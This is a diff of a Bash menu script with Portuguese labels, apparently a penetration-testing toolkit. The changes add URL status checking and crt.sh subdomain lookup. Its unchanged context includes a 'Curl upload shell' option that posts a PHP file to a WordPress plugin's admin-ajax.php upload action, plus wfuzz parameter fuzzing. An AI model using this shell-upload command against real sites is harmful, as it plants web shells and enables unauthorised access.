@@ -10,7 +10,7 @@ FALSE "Encontrar subdomínios-gobuster" \
 FALSE "Encontrar subdomínios-for" \
 FALSE "Encontrar subdommínios-curl" \
 FALSE "Encontrar subdomínios-subfinder" \
-FALSE "Mudar inicio de subdominios de wordlist" \
+FALSE "Mudar inicio de de subdominios de wordlist" \
 FALSE "Usar o httpx-toolkit sem ip" \
 FALSE "Usar o httpx-toolkit com ip" \
 FALSE "Retornar o HTTP headers" \
@@ -30,6 +30,8 @@ FALSE "Ler arquivo php com token" \
 FALSE "wfuzz saber filtro" \
 FALSE "Wfuzz selecionar filtro" \
 FALSE "Curl upload shell" \
+FALSE "Testar sites válidos com o curl" \
+FALSE "Encontrado subdomíneos com curl e jq" \
 TRUE  "Sair" )
 
 case $go in
@@ -200,7 +202,7 @@ for i in $(cat $WORDLIST); do
 #esperas.
 
 # Mostra o domínio que está sendo testado
-sleep 1
+sleep 0.5
  echo "Tentando conectar a ${i}.${dominio}..."
 HTTP_STATUS=$(curl -m 2 -s -o /dev/null -I -w "%{http_code}" --connect-timeout 2 -A "$USER_AGENT" "${i}.${dominio}")
 # Verifica se o código de status HTTP indica sucesso (códigos 2xx ou 3xx)
@@ -219,11 +221,12 @@ dominio=$(zenity --entry  --title "Dominio" --text "Digite o dominio:")
 subfinder -all  -d  "$dominio" -silent  -o sub.txt
 echo "foi criado um arquivo chamado sub.txt "
 ;;
-"Mudar inicio de subdominios de wordlist")
+"Mudar inicio de de subdominios de wordlist")
+w2=$(zenity --entry  --title "wordlist2" --text "Digite um nome para nova wordlist:")
 dominio=$(zenity --entry  --title "Dominio" --text "Digite palavra inicial para subdominio:")
 wlist=$(zenity --file-selection --title  "Selecione a wordlist desejada:" --filename=".") 
-cat "$wlist" | sed "s/^/$dominio./" > wordlist2
-zenity --info --title="informação" --text="A wordlist2 foi criada"
+cat "$wlist" | sed "s/^/$dominio./" > "$w2"
+zenity --info --title="informação" --text="A "$w2" foi criada"
 ;;
 "Usar o httpx-toolkit sem ip")
 lista=$(zenity --file-selection --title  "SELECIONE a lista de subdomínio desejada:" --filename=".") 
@@ -534,6 +537,42 @@ echo wfuzz -c -w "$wlist" -d \""token=$token&source=FUZZ"\" -H \""User-Agent:$ua
 "Curl upload shell")
 url=$(zenity --title url --text "Digite a url" --entry )
 curl -k -X POST -F "action=upload" -F "Filedata=@./mine.php" -F "action=nm_webcontact_upload_file" http://"$url"/wordpress/wp-admin/admin-ajax.php s
+;;
+"Testar sites válidos com o curl")
+# --- CONFIGURAÇÕES ---
+# Arquivo contendo a lista de URLs a serem verificadas
+URL_FILE=$(zenity --file-selection --title  "SELECIONE A LISTA DESEJADA:" --filename=".")
+
+echo "Iniciando verificação de URLs..."
+
+# Loop através de cada linha no arquivo de URLs
+while IFS= read -r url; do
+  # Pula linhas vazias
+  [[ -z "$url" ]] && continue
+
+  # Usa curl para obter o código de status HTTP
+  # -s: Modo silencioso (não mostra barra de progresso ou mensagens de erro)
+  # -o /dev/null: Descarta o corpo da resposta
+  # -w "%{http_code}": Imprime apenas o código HTTP na saída padrão
+  # --max-time 5: Define um tempo limite de 5 segundos
+  # -L: Segue redirecionamentos (como 301, 302) para a URL final
+  http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -L "$url")
+
+  # Verifica se o código de status indica sucesso (2xx ou 3xx)
+  if [[ "$http_code" =~ ^[23] ]]; then
+    echo "[VÁLIDO] Status: $http_code | URL: $url"
+  else
+    echo "[INVÁLIDO] Status: $http_code | URL: $url"
+  fi
+done < "$URL_FILE"
+
+echo "Verificação concluída."
+;;
+"Encontrado subdomíneos com curl e jq")
+sub=$(zenity --entry  --title "url" --text "Digite o subdomíneo:")
+curl -s -A "$USER_AGENT" "https://crt.sh/json?q=$sub" | jq -r '.[]' | zenity --title "Aguarde um momento.." --text-info --editable --width=1000 --height=600  2>/dev/null
+para=$(zenity --entry  --title "url" --text "Digite o parametro pesquisado pelo jq")
+echo "curl -s  \"https://crt.sh/json?q=$sub\" | jq -r ' .[ ].$para ' | sort -u " | zenity --title "Digite no terminal" --text-info --editable --width=800 --height=400  2>/dev/null
 ;;
 "Sair")
 clear
